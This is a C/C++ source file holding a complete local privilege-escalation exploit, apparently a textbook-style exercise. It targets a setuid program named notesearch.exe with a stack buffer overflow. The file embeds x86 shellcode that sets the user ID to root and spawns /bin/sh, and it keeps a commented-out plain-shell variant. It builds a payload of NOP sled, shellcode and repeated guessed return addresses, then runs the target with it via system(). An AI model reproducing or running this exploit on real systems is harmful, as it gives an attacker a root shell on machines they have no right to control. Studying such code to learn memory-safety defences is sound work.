#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>

using namespace std;
   
char shellcode[] = 
     // root shell; that escalates the priviledge for exploiting chmod program
     "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
     "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
     "\xe1\xcd\x80";
     
     // regular shell
     /*
     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
     "\xc9\x89\xca\x6a\x0b\x58\xcd\x80";
     */

int main(int argc, char *argv[]) {
    // address of ref_var is used as the point of reference to determine offset
    size_t ref_var, ret_address, offset;
    size_t payload_len;
    char *ptr, *payload;

    if(argc == 2) // set offset
        offset = atoi(argv[1]);
    else
        offset = 228; // FIXME, if offset is determined

    // create payload
    // | NOP sled | shellcode | repeated return address |
    char target_program[] = "./notesearch.exe \""; // ./program_name "arg"
    payload_len = 200; // FXIME: 200 must be big enough to cover the caller's return address
    payload = new char[payload_len];

    size_t NOP_sled_len = 60; //payload_len-shellcode_len-(4*ret_address_count)-target_prog_len;
    
    // initialize the payload with 0s
    memset(payload, 0, payload_len);

    strcpy(payload, target_program); // start payload buffer
    ptr = payload + strlen(payload); // set ptr at the end

    ret_address = (unsigned int) &ref_var - offset; // set return address

    for(int i=0; i<160; i+=4) // fill ptr with return address
        *((unsigned int *)(ptr+i)) = ret_address;

    memset(ptr, 0x90, NOP_sled_len); // build NOP sled
    ptr += NOP_sled_len;

    memcpy(ptr, shellcode, sizeof(shellcode)-1);

    strcat(payload, "\"");
    //printf("%s", payload);
    system(payload); // run exploit
    delete [] payload;
}

